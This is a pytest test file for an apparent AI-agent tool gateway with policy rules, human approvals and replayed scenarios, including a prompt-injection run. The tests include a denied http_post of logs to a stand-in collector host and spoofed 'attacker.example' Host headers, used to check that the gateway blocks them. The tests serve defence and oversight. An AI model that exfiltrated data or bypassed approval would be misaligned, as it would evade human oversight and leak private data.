"""End-to-end tests over real HTTP: operator API, MCP gateway, approvals, SSE, replay runs."""

from __future__ import annotations

import asyncio
import json
import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx
import httpx2
import pytest

from tests.liveserver import OPERATOR_TOKEN, LiveServer

ATTACKER = "203.0.113.42"
BLOCK = {"ip": ATTACKER, "reason": "EVT-0004..EVT-0022", "duration_minutes": 60}


@pytest.fixture
def srv(tmp_path: Path) -> Iterator[LiveServer]:
    with LiveServer(tmp_path) as s:
        yield s


def text_of(result: Any) -> str:
    return "".join(getattr(c, "text", "") for c in result.content)


# --- authentication ---------------------------------------------------------------


def test_api_requires_operator_token(srv: LiveServer) -> None:
    with srv.api(token=None) as c:
        assert c.get("/api/health").status_code == 200
        assert c.get("/api/runs").status_code == 401
        assert c.get("/api/policies/current").status_code == 401
    with srv.api(token="wrong") as c:
        assert c.get("/api/runs").status_code == 401


def test_run_token_cannot_use_the_api_so_agents_cannot_self_approve(srv: LiveServer) -> None:
    created = srv.create_run()
    run_token = created["token"]
    with srv.api(token=run_token) as c:
        assert c.get("/api/runs").status_code == 401
        r = c.post(
            "/api/approvals/act_x/resolve", json={"decision": "approve", "args_hash": "sha256:" + "0" * 64}
        )
        assert r.status_code == 401


async def test_mcp_rejects_missing_or_wrong_tokens(srv: LiveServer) -> None:
    body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
    headers = {"Accept": "application/json, text/event-stream", "Content-Type": "application/json"}
    async with httpx2.AsyncClient() as http:
        r = await http.post(srv.settings.mcp_url, json=body, headers=headers)
        assert r.status_code == 401
        r = await http.post(
            srv.settings.mcp_url, json=body, headers={**headers, "Authorization": f"Bearer {OPERATOR_TOKEN}"}
        )
        assert r.status_code == 401, "the operator token is not an agent credential"
        r = await http.post(
            srv.settings.mcp_url, json=body, headers={**headers, "Authorization": "Bearer agr_nope"}
        )
        assert r.status_code == 401


async def test_mcp_rejects_dns_rebinding_host(srv: LiveServer) -> None:
    token = srv.create_run()["token"]
    headers = {
        "Accept": "application/json, text/event-stream",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
        "Host": "attacker.example",
    }
    body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
    async with httpx2.AsyncClient() as http:
        r = await http.post(srv.settings.mcp_url, json=body, headers=headers)
    assert r.status_code in (400, 403, 421)


# --- MCP gateway -------------------------------------------------------------------


async def test_tools_are_listed_with_strict_schemas(srv: LiveServer) -> None:
    token = srv.create_run()["token"]
    async with srv.mcp(token) as client:
        tools = (await client.list_tools()).tools
    assert sorted(t.name for t in tools) == ["block_ip", "get_ip_activity", "get_user_logins", "http_post"]
    assert all(t.input_schema.get("additionalProperties") is False for t in tools)


async def test_calls_are_decided_by_the_gate(srv: LiveServer) -> None:
    created = srv.create_run()
    run_id = created["run"]["id"]
    async with srv.mcp(created["token"]) as client:
        ok = await client.call_tool("get_user_logins", {"user": "alice"})
        assert not ok.is_error and "EVT-0022" in text_of(ok)
        denied = await client.call_tool("http_post", {"url": "https://collector.example/x", "body": "logs"})
        assert denied.is_error and "R-21-no-exfil-after-private-read" in text_of(denied)
        invalid = await client.call_tool("get_user_logins", {"user": "alice", "dataset": "other"})
        assert invalid.is_error and "builtin:invalid-args" in text_of(invalid)
        unknown = await client.call_tool("delete_everything", {})
        assert unknown.is_error
    with srv.api() as c:
        data = c.get(f"/api/runs/{run_id}").json()
    states = [(a["tool"], a["state"]) for a in data["actions"]]
    assert states == [
        ("get_user_logins", "succeeded"),
        ("http_post", "denied"),
        ("get_user_logins", "denied"),
        ("delete_everything", "denied"),
    ]
    assert data["metrics"]["executed"] == 1
    assert srv.services.store.executions(run_id, "http_post") == []


async def test_approval_flow_over_http(srv: LiveServer) -> None:
    created = srv.create_run()
    run_id = created["run"]["id"]
    progress_messages: list[str] = []

    async def on_progress(progress: float, total: float | None, message: str | None) -> None:
        progress_messages.append(message or "")

    async with srv.mcp(created["token"]) as client:
        await client.call_tool("get_user_logins", {"user": "alice"})
        call = asyncio.create_task(client.call_tool("block_ip", BLOCK, progress_callback=on_progress))
        pending = await asyncio.to_thread(srv.wait_action, run_id, "pending_approval")
        assert srv.services.store.executions(run_id, "block_ip") == []
        assert pending["args"] == BLOCK

        with srv.api() as c:
            bad = c.post(
                f"/api/approvals/{pending['id']}/resolve",
                json={"decision": "approve", "args_hash": "sha256:" + "f" * 64},
            )
            assert bad.status_code == 409
            ok = c.post(
                f"/api/approvals/{pending['id']}/resolve",
                json={"decision": "approve", "args_hash": pending["args_hash"]},
            )
            assert ok.status_code == 200 and ok.json()["action"]["approver"] == "operator"
            again = c.post(
                f"/api/approvals/{pending['id']}/resolve",
                json={"decision": "approve", "args_hash": pending["args_hash"]},
            )
            assert again.status_code == 409

        result = await asyncio.wait_for(call, 10)
        assert not result.is_error and "mock-applied" in text_of(result)
    assert progress_messages, "the gateway sends progress updates while a human decides"
    assert len(srv.services.store.executions(run_id, "block_ip")) == 1


async def test_cancel_run_while_call_waits(srv: LiveServer) -> None:
    created = srv.create_run()
    run_id = created["run"]["id"]
    async with srv.mcp(created["token"]) as client:
        await client.call_tool("get_user_logins", {"user": "alice"})
        call = asyncio.create_task(client.call_tool("block_ip", BLOCK))
        pending = await asyncio.to_thread(srv.wait_action, run_id, "pending_approval")
        with srv.api() as c:
            r = c.post(f"/api/runs/{run_id}/cancel")
            assert r.status_code == 200 and r.json()["run"]["state"] == "cancelled"
            late = c.post(
                f"/api/approvals/{pending['id']}/resolve",
                json={"decision": "approve", "args_hash": pending["args_hash"]},
            )
            assert late.status_code == 409
        result = await asyncio.wait_for(call, 10)
        assert result.is_error
        after = await client.call_tool("get_user_logins", {"user": "alice"})
        assert after.is_error and "run-inactive" in text_of(after)
    assert srv.services.store.executions(run_id, "block_ip") == []


# --- replay scenarios ----------------------------------------------------------------


def start_replay(srv: LiveServer, scenario: str) -> str:
    sc = {s["id"]: s for s in srv.api().get("/api/scenarios").json()}[scenario]
    created = srv.create_run(
        task=sc["task"], mode="replay", scenario=scenario, dataset_id=sc["dataset"], subject=sc["subject"]
    )
    assert "token" not in created, "replay tokens stay inside the server"
    return created["run"]["id"]


def test_replay_normal(srv: LiveServer) -> None:
    run_id = start_replay(srv, "normal")
    data = srv.wait_run(run_id, {"completed", "failed", "halted"})
    assert data["run"]["state"] == "completed", data["run"]["state_reason"]
    assert [a["state"] for a in data["actions"]] == ["succeeded", "succeeded"]
    assert data["run"]["summary_check"]["unknown"] == []
    assert data["run"]["summary_check"]["not_seen_by_agent"] == []
    assert data["run"]["agent"]["kind"] == "replay"


def test_replay_injection_upload_is_denied(srv: LiveServer) -> None:
    run_id = start_replay(srv, "injection")
    data = srv.wait_run(run_id, {"completed", "failed", "halted"})
    assert data["run"]["state"] == "completed"
    post = [a for a in data["actions"] if a["tool"] == "http_post"]
    assert len(post) == 1 and post[0]["state"] == "denied"
    assert post[0]["decision"]["rule_ids"] == ["R-21-no-exfil-after-private-read"]
    assert "http_post: blocked by policy" in data["run"]["summary"]
    assert srv.services.store.executions(run_id, "http_post") == []
    types = [e.type for e in srv.services.store.events_after(run_id)]
    assert "result.flagged" in types


def test_replay_overreach_is_refused(srv: LiveServer) -> None:
    """The agent is not compromised, just wrong: both harmful blocks are denied."""
    run_id = start_replay(srv, "overreach")
    data = srv.wait_run(run_id, {"completed", "failed", "halted"})
    assert data["run"]["state"] == "completed"
    blocks = [a for a in data["actions"] if a["tool"] == "block_ip"]
    assert [(a["state"], a["decision"]["rule_ids"]) for a in blocks] == [
        ("denied", ["R-10-no-block-protected"]),
        ("denied", ["R-12-block-max-24h"]),
    ]
    assert srv.services.store.executions(run_id, "block_ip") == []
    assert data["metrics"]["policy_denials"] == 2 and data["metrics"]["pending_approvals"] == 0
    assert data["run"]["summary"].count("block_ip: blocked by policy") == 2
    assert data["run"]["summary_check"]["unknown"] == []
    read = next(a for a in data["actions"] if a["tool"] == "get_user_logins")
    assert "Autumn#2026" not in str(read["result"]), "Bob's mistyped password is redacted"


@pytest.mark.parametrize("decision", ["approve", "deny"])
def test_replay_approval(srv: LiveServer, decision: str) -> None:
    run_id = start_replay(srv, "approval")
    pending = srv.wait_action(run_id, "pending_approval")
    assert srv.services.store.executions(run_id, "block_ip") == []
    with srv.api() as c:
        r = c.post(
            f"/api/approvals/{pending['id']}/resolve",
            json={"decision": decision, "args_hash": pending["args_hash"]},
        )
        assert r.status_code == 200
    data = srv.wait_run(run_id, {"completed", "failed", "halted"})
    executed = srv.services.store.executions(run_id, "block_ip")
    if decision == "approve":
        assert len(executed) == 1 and executed[0]["args"]["ip"] == ATTACKER
        assert "block_ip: executed" in data["run"]["summary"]
    else:
        assert executed == []
        assert "declined by a human" in data["run"]["summary"]
        assert data["metrics"]["human_denials"] == 1


def test_replay_needs_scenario(srv: LiveServer) -> None:
    with srv.api() as c:
        r = c.post("/api/runs", json={"task": "x", "mode": "replay"})
    assert r.status_code == 409


# --- events ----------------------------------------------------------------------------


def read_sse(srv: LiveServer, run_id: str, *, until: str, last_event_id: int | None = None) -> list[dict]:
    headers = {"Authorization": f"Bearer {OPERATOR_TOKEN}"}
    if last_event_id is not None:
        headers["Last-Event-ID"] = str(last_event_id)
    events: list[dict] = []
    with (
        httpx.Client(base_url=srv.url, timeout=20) as c,
        c.stream("GET", f"/api/runs/{run_id}/events", headers=headers) as r,
    ):
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/event-stream")
        for line in r.iter_lines():
            if line.startswith("data: "):
                events.append(json.loads(line[6:]))
                if events[-1]["type"] == until:
                    break
    return events


def test_sse_stream_is_ordered_and_resumable(srv: LiveServer) -> None:
    run_id = start_replay(srv, "normal")
    events = read_sse(srv, run_id, until="run.completed")
    seqs = [e["seq"] for e in events]
    assert seqs == sorted(seqs) and len(set(seqs)) == len(seqs)
    types = [e["type"] for e in events]
    assert types[0] == "run.created" and types[-1] == "run.completed"
    assert types.count("tool.executed") == 2
    # Reconnect from the middle: only newer events, no duplicates.
    mid = seqs[len(seqs) // 2]
    resumed = read_sse(srv, run_id, until="run.completed", last_event_id=mid)
    assert [e["seq"] for e in resumed] == [s for s in seqs if s > mid]


def test_live_events_arrive_while_streaming(srv: LiveServer) -> None:
    run_id = start_replay(srv, "approval")
    pending = srv.wait_action(run_id, "pending_approval")

    def approve_later() -> None:
        time.sleep(0.3)
        with srv.api() as c:
            c.post(
                f"/api/approvals/{pending['id']}/resolve",
                json={"decision": "approve", "args_hash": pending["args_hash"]},
            )

    import threading

    threading.Thread(target=approve_later).start()
    events = read_sse(srv, run_id, until="run.completed")
    types = [e["type"] for e in events]
    assert types.index("approval.requested") < types.index("approval.resolved") < types.index("run.completed")


# --- policy and dashboard ------------------------------------------------------------------


def test_policy_endpoint(srv: LiveServer) -> None:
    with srv.api() as c:
        pol = c.get("/api/policies/current").json()
        assert pol["version"].startswith("p-") and len(pol["rules"]) == 16
        assert sum(r["inactive"] for r in pol["rules"]) == 5
        assert c.post("/api/policies/reload").status_code in (404, 405)


def test_dashboard_is_served_with_security_headers(srv: LiveServer) -> None:
    with srv.api(token=None) as c:
        r = c.get("/")
    assert r.status_code == 200 and "AgentGuard" in r.text
    csp = r.headers["content-security-policy"]
    assert "script-src 'self'" in csp and "unsafe-inline" not in csp
    assert r.headers["x-content-type-options"] == "nosniff"


def test_external_run_response_contains_connect_instructions(srv: LiveServer) -> None:
    created = srv.create_run()
    assert created["token"].startswith("agr_")
    assert created["mcp_config"]["mcpServers"]["agentguard"]["url"] == srv.settings.mcp_url
    assert "claude mcp add --transport http agentguard" in created["claude_command"]
    stored = srv.services.store.get_run(created["run"]["id"])
    assert stored is not None and created["token"] not in stored.token_hash


def test_history_survives_a_server_restart(tmp_path: Path) -> None:
    with LiveServer(tmp_path) as first:
        run_id = start_replay(first, "normal")
        first.wait_run(run_id, {"completed"})
        before = [(e.seq, e.type) for e in first.services.store.events_after(run_id)]
    with LiveServer(tmp_path) as second, second.api() as c:
        runs = c.get("/api/runs").json()
        assert [r["id"] for r in runs] == [run_id] and runs[0]["state"] == "completed"
        after = [(e.seq, e.type) for e in second.services.store.events_after(run_id)]
        assert after == before
        replayed = read_sse(second, run_id, until="run.completed")
        assert [(e["seq"], e["type"]) for e in replayed] == before


def test_public_url_behind_a_proxy(tmp_path: Path) -> None:
    """Bound on all interfaces behind an HTTPS proxy: local clients use loopback,
    connect instructions use the public URL, and the MCP endpoint accepts the public Host."""
    from agentguard.config import Settings

    s = Settings()
    s.host = "0.0.0.0"  # noqa: S104
    s.port = 9001
    s.public_url = "https://vm.example.test:9001/"
    assert s.mcp_url == "http://127.0.0.1:9001/mcp"
    assert s.public_mcp_url == "https://vm.example.test:9001/mcp"

    def configure(settings: Settings) -> None:
        settings.public_url = "https://vm.example.test:9001"

    with LiveServer(tmp_path, configure=configure) as srv:
        created = srv.create_run()
        assert created["mcp_config"]["mcpServers"]["agentguard"]["url"] == "https://vm.example.test:9001/mcp"
        assert "https://vm.example.test:9001/mcp" in created["claude_command"]
        body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
        headers = {
            "Accept": "application/json, text/event-stream",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {created['token']}",
        }
        with httpx.Client(timeout=10) as c:
            ok = c.post(srv.settings.mcp_url, json=body, headers={**headers, "Host": "vm.example.test:9001"})
            bad = c.post(srv.settings.mcp_url, json=body, headers={**headers, "Host": "evil.example:9001"})
        assert ok.status_code == 200 and "get_user_logins" in ok.text
        assert bad.status_code in (400, 403, 421)
